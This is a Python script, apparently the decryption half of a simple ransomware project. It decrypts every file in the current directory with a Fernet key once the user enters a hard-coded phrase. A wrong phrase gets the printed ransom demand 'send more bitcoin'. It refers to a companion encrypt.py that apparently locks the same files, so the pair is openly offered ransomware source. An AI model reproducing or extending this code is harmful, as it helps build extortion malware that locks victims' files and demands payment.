
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.txt" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.txt", "rb") as key:
    secretkey=key.read()

secretphrase= "sexy"

user_phrase= input("Enter the secret phrase: ")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            data = thefile.read()

        fernet = Fernet(secretkey)
        contents_decrypted = fernet.decrypt(data)

        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats you got the key, now your files are decrypted")

else:
    print("You don't have the key, send more bitcoin")
